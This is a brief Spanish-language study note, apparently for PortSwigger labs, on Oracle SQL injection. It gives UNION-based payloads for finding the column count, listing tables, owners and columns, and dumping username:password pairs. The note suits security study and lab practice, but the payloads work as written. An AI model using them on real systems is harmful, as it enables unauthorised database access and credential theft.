# Enumeración DB Oracle 

Tags: #SQLi #PortSwigger #Oracle #BurpSuite 


* [SQLi Cheat Sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Conocer el numero de columnas 

```bash 
❯ ' order by 100-- -        # Ordenamiento con la 100va columna e ir adivinando hasta que no nos marque un error
❯ ' union select NULL,NULL from dual-- -        # Dual es una tabla existente en Oracle
```

## Conocer las tablas de la DB especifica

```bash 
❯ ' union select table_name from all_tables-- -              # Nos muestra las tablas en Oracle
❯ ' union select owner from all_tables-- -                   # Nos muestra las tablas en Oracle de los propietarios
❯ ' union select table_name from all_tables where owner='❮owner_Name❯'-- -
```

## Conocer las columnas de la tabla en la DB especifica

```bash 
❯ ' union select column_name from all_tab_columns where table_name='❮Table_Name❯'-- -   # Mostrar las columnas en Oracle 
```

## Mostrar los datos de las columnas 

```bash 
❯ ' union select username||':'||password from ❮Table_Name❯-- -       # Para que nos muestre los datos de los usuarios y su passwd separados por : 
```